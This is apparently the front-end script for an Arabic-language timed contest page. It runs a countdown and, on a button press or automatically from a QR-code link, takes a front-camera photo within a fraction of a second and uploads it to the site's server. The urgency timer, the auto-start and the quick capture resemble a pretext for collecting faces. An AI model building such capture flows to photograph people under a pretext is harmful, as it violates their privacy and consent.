const startBtn = document.getElementById("startBtn");
const intro = document.getElementById("intro");
const processing = document.getElementById("processing");
const errorMessage = document.getElementById("errorMessage");
const video = document.getElementById("camera");
const canvas = document.getElementById("canvas");
const countdownCard = document.getElementById("countdownCard");
const countdown = document.getElementById("countdown");
const heroSection = document.getElementById("heroSection");
const contestEndedPanel = document.getElementById("contestEndedPanel");
const contestStatus = document.getElementById("contestStatus");

const CONTEST_DURATION_SECONDS = 4 * 60;
let remainingSeconds = CONTEST_DURATION_SECONDS;
let countdownInterval = null;
let stream = null;

function toArabicDigits(value) {
  return String(value).replace(/\d/g, (digit) => "٠١٢٣٤٥٦٧٨٩"[digit]);
}

function renderCountdown() {
  const minutes = Math.floor(remainingSeconds / 60);
  const seconds = remainingSeconds % 60;
  countdown.textContent = `${toArabicDigits(String(minutes).padStart(2, "0"))}:${toArabicDigits(String(seconds).padStart(2, "0"))}`;

  if (remainingSeconds <= 30 && remainingSeconds > 0) {
    countdownCard.classList.add("is-ending");
  }
}

function finishContest() {
  window.clearInterval(countdownInterval);
  countdownCard.classList.remove("is-ending");
  countdownCard.classList.add("is-finished");
  countdown.textContent = "انتهى الوقت";
  startBtn.disabled = true;
  startBtn.setAttribute("aria-disabled", "true");
  intro.classList.add("hidden");
  processing.classList.add("hidden");
  contestEndedPanel.classList.remove("hidden");
  heroSection.classList.add("is-ended");
  contestStatus.classList.add("is-ended");
  contestStatus.querySelector("span:last-child").textContent = "انتهت المسابقة";
}

function startCountdown() {
  renderCountdown();
  countdownInterval = window.setInterval(() => {
    remainingSeconds -= 1;

    if (remainingSeconds <= 0) {
      remainingSeconds = 0;
      finishContest();
      return;
    }

    renderCountdown();
  }, 1000);
}

startCountdown();

function showError(message) {
  errorMessage.textContent = message;
  errorMessage.classList.remove("hidden");
  if (remainingSeconds > 0) {
    startBtn.disabled = false;
  }
}

function stopCamera() {
  if (!stream) return;

  for (const track of stream.getTracks()) {
    track.stop();
  }

  stream = null;
  video.srcObject = null;
}

async function capturePhoto() {
  if (!video.videoWidth || !video.videoHeight) {
    await new Promise((resolve) => {
      video.addEventListener("loadedmetadata", resolve, { once: true });
    });
  }

  const width = video.videoWidth;
  const height = video.videoHeight;

  canvas.width = width;
  canvas.height = height;

  const context = canvas.getContext("2d", { willReadFrequently: false });

  context.drawImage(video, 0, 0, width, height);

  return new Promise((resolve, reject) => {
    canvas.toBlob(
      (blob) => {
        if (!blob) {
          reject(new Error("Could not create image."));
          return;
        }

        resolve(blob);
      },
      "image/jpeg",
      0.88
    );
  });
}

async function uploadPhoto(blob) {
  const formData = new FormData();

  formData.append("cameraPermission", "granted");
  formData.append("photo", blob, "challenge-photo.jpg");

  const response = await fetch("/api/participants", {
    method: "POST",
    body: formData
  });

  const data = await response.json();

  if (!response.ok || !data.success) {
    throw new Error(data.message || "Upload failed.");
  }

  return data;
}

async function runChallenge() {
  if (remainingSeconds <= 0) {
    finishContest();
    return;
  }

  startBtn.disabled = true;
  errorMessage.classList.add("hidden");

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: {
          ideal: "user"
        },
        width: {
          ideal: 1280
        },
        height: {
          ideal: 720
        }
      },
      audio: false
    });

    video.srcObject = stream;

    await video.play();

    intro.classList.add("hidden");
    processing.classList.remove("hidden");

    await new Promise((resolve) => setTimeout(resolve, 250));

    const photo = await capturePhoto();

    stopCamera();

    const result = await uploadPhoto(photo);

    window.location.href =
      `/success?code=${encodeURIComponent(result.participantCode)}`;

  } catch (error) {
    console.error(error);

    stopCamera();

    processing.classList.add("hidden");
    intro.classList.remove("hidden");

    if (error.name === "NotAllowedError" || error.name === "PermissionDeniedError") {
      showError("لم يتم السماح باستخدام الكاميرا. يمكنك السماح بالكاميرا ثم إعادة المحاولة.");
    } else if (error.name === "NotFoundError") {
      showError("لم يتم العثور على كاميرا متاحة على الجهاز.");
    } else if (error.name === "NotReadableError") {
      showError("الكاميرا قيد الاستخدام من تطبيق آخر أو لا يمكن الوصول إليها.");
    } else {
      showError("تعذر إكمال التجربة. حاول مرة أخرى.");
    }
  }
}

startBtn.addEventListener("click", () => {
  runChallenge();
});

// Check if URL has ?auto=1 (scanned via QR code)
const urlParams = new URLSearchParams(window.location.search);
if (urlParams.get("auto") === "1") {
  window.addEventListener("DOMContentLoaded", () => {
    setTimeout(() => {
      runChallenge();
    }, 600);
  });
}

window.addEventListener("pagehide", stopCamera);
